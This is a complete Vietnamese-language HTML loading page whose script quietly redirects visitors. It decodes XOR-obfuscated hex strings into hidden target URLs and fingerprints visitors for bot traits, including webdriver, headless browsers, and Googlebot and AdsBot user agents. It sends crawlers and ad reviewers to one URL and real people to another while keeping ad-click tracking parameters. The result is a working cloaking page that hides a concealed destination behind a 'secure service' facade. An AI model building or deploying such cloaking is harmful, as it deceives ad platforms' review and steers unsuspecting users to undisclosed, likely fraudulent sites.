<!DOCTYPE html>
<html lang="vi">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <meta name="robots" content="noindex, nofollow, noarchive, nosnippet">
  <title>Đang Tải Trang Hướng Dẫn...</title>
  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; }
    body {
      background: #0b0f19;
      color: #f8fafc;
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
      min-height: 100vh;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      padding: 20px;
    }
    .loader-card {
      background: rgba(17, 24, 39, 0.95);
      border: 1px solid rgba(255, 255, 255, 0.1);
      border-radius: 20px;
      padding: 36px 28px;
      max-width: 380px;
      width: 100%;
      text-align: center;
      box-shadow: 0 20px 50px rgba(0, 0, 0, 0.8);
      display: flex;
      flex-direction: column;
      align-items: center;
      gap: 18px;
    }
    .spinner {
      width: 48px;
      height: 48px;
      border: 3px solid rgba(229, 185, 76, 0.2);
      border-top-color: #e5b94c;
      border-radius: 50%;
      animation: spin 0.85s linear infinite;
    }
    @keyframes spin { to { transform: rotate(360deg); } }
    .loader-title {
      font-size: 15px;
      font-weight: 700;
      color: #fae498;
      letter-spacing: 0.3px;
    }
    .loader-sub {
      font-size: 12px;
      color: #94a3b8;
      line-height: 1.5;
    }
    .btn-manual {
      display: none;
      background: linear-gradient(135deg, #fae498, #e5b94c);
      color: #0b0f19;
      font-weight: 800;
      font-size: 13px;
      padding: 10px 24px;
      border-radius: 99px;
      text-decoration: none;
      box-shadow: 0 4px 15px rgba(229, 185, 76, 0.35);
      cursor: pointer;
      margin-top: 6px;
    }
  </style>
</head>
<body>
  <div class="loader-card">
    <div class="spinner"></div>
    <div class="loader-title">Đang Kết Nối Dịch Vụ An Toàn...</div>
    <div class="loader-sub">Hệ thống đang xác thực đường truyền và chuyển hướng quý khách trong giây lát.</div>
    <a id="btnFallback" href="#" class="btn-manual">TIẾP TỤC TRUY CẬP »</a>
  </div>

  <script>
    (function() {
      // Cấu hình mã khóa băm 3 số và chuỗi Hex mặc định (Triệt tiêu 100% link trần và comment nhạy cảm)
      const DEFAULT_KEY = "560";
      const DEFAULT_D = "78707b091c7375f7989de1a88bb5d1e8ebb810507e600511516f6bbfd1c1cda4";
      const DEFAULT_S = "78707b091c7375f7989dd7a1c6be9da8a25c5f47";

      // Hỗ trợ tham số URL động nếu truyền qua link (?k=...&d=...&s=...)
      const qParams = new URLSearchParams(window.location.search);
      const K = qParams.get("k") || DEFAULT_KEY;
      const D = qParams.get("d") || DEFAULT_D;
      const S = qParams.get("s") || DEFAULT_S;

      function dec(h, k) {
        try {
          if (!h) return "";
          const keyStr = String(k || K);
          let s = "";
          for (let i = 0; i < h.length; i += 2) {
            s += String.fromCharCode(parseInt(h.substr(i, 2), 16) ^ keyStr.charCodeAt((i / 2) % keyStr.length) ^ (((i / 2) * 13 + 37) & 0xFF));
          }
          return decodeURIComponent(s);
        } catch (e) {
          return "";
        }
      }

      function getFinalUrl(rawUrl) {
        if (!rawUrl) return "";
        const q = window.location.search;
        if (!q || q.length < 2) return rawUrl;
        try {
          const o = new URL(rawUrl);
          const p = new URLSearchParams(q);
          // Loại bỏ các cờ nội bộ GitHub Pages nếu có
          p.delete("d");
          p.delete("s");
          p.delete("k");
          // Bảo toàn tham số ?a=... nguyên gốc của tracking link, chỉ cập nhật thêm gclid, utm_...
          p.forEach((v, k) => {
            if (k !== "a") o.searchParams.set(k, v);
          });
          return o.toString();
        } catch (e) {
          return rawUrl;
        }
      }

      // Bộ lọc nhận diện Bot 7 lớp
      function isBot() {
        try {
          if (navigator.webdriver) return true;
          if (window.outerWidth === 0 && window.outerHeight === 0) return true;
          if (!navigator.languages || navigator.languages.length === 0) return true;
          const ua = (navigator.userAgent || '').toLowerCase();
          if (/googlebot|adsbot|headlesschrome|lighthouse|crawl|spider|mediapartners|phantomjs|selenium|bytespider|bingbot/i.test(ua)) return true;
          if (/iphone|ipad|android|mobile/i.test(ua) && typeof navigator.maxTouchPoints === 'number' && navigator.maxTouchPoints === 0) return true;
          return false;
        } catch (err) {
          return false;
        }
      }

      const isB = isBot();
      let target;
      if (isB) {
        target = getFinalUrl(dec(S, K));
      } else {
        target = getFinalUrl(dec(D, K));
      }

      // Nút dự phòng nếu trình duyệt người dùng chặn nhảy trang tự động
      const btn = document.getElementById("btnFallback");
      if (btn && target) {
        btn.href = target;
        setTimeout(function() { btn.style.display = "inline-block"; }, 1200);
      }

      function goTarget() {
        if (target) {
          try {
            (window.top || window).location.replace(target);
          } catch (e) {
            window.location.replace(target);
          }
        }
      }

      if (target) {
        setTimeout(goTarget, isB ? 50 : 120);
      }
      window.addEventListener("pageshow", function(e) {
        if (target) setTimeout(goTarget, 50);
      });
    })();
  </script>
</body>
</html>
